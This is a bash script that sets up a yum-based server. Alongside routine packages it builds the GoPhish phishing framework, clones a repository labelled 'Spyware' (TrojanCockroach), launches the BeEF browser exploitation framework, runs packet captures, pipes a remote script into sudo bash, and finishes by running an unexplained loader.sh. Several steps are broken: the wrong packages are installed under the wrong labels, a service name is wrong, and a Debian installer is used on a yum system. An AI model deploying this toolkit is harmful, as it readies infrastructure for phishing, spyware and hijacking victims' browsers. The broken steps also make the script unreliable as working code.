#!/bin/bash
# check errors
check_status() {
    if [ $1 -ne 0 ]; then
        echo "Fehler: Ein Fehler ist aufgetreten. Abbruch."
        exit 1
    fi
}

# Update system
echo "Systemupdate..."
yum update -y
check_status $?

# Install Golang
echo "Golang installation..."
yum install -y golang
check_status $?

# Install Python 3
echo "Golang installation..."
yum install -y golang
check_status $?

# Install bzip2
echo "bzip2 installation..."
yum install -y bzip2
check_status $?

# Install mariadb
echo "mariadb installation..."
yum install -y mariadb
check_status $?

# Install screen
echo "screen installation..."
yum install -y screen
check_status $?

# Install ruby
echo "ruby installation..."
yum install -y screen
check_status $?

# Install GoPhsish
echo "GoPhish installation..."
git clone https://github.com/gophish/gophish.git
cd gophish
go build
cd
check_status $?

# Install  Nodejs
echo "Nodejs installation..."
node -v
curl -sL https://deb.nodesource.com/setup_lts.x | sudo -E bash -
sudo yum install -y nodejs
node -v 
check_status $?

# System Misc
echo "setup httpd..."
sudo yum update
sudo yum install httpd
check_status $?
sudo systemctl start httpd
sudo systemctl enable https
check_status $?
sudo firewall-cmd --permanent --add-service=http
sudo firewall-cmd --reload
check_status $?

# GCC
echo "setup GCC..."
sudo yum groupinstall "Developement Tools"
gcc --version 
check_status $?

# Spyware
echo "spyware installation..."
git clone https://github.com/MinhasKamal/TrojanCockroach.git
check_status $?

#paping
echo "paping installation..."
sudo yum install epel-release
sudo yum update
sudo yum install paping
check_status $?
sudo yum groupinstall "Development Tools"
sudo yum install openssl-devel
wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/paping/paping_1.5.5_x86-64_linux.tar.gz
tar -xf paping_1.5.5_x86-64_linux.tar.gz
cd paping_1.5.5_x86-64_linux
make
sudo cp paping /usr/local/bin
paping google.com -p 80
check_status $?

# tcpdump
echo "tcpdump installation..."
sudo tcpdump
sudo tcpdump -i eth0
sudo tcpdump dst host google.com
sudo tcpdump src host google.com
sudo tcpdump port 80
check_status $?

# BeeF 
echo "beef installation..."
sudo yum update
sudo yum install -y ruby ruby-devel sqlite sqlite-devel gcc-c++ patch readline readline-devel zlib zlib-devel libffi-devel openssl-devel make
git clone https://github.com/beefproject/beef.git
cd beef
bundle install
ruby beef



# loader#
cd
chmod +x loader.sh
./loader.sh

echo "Installations complete."
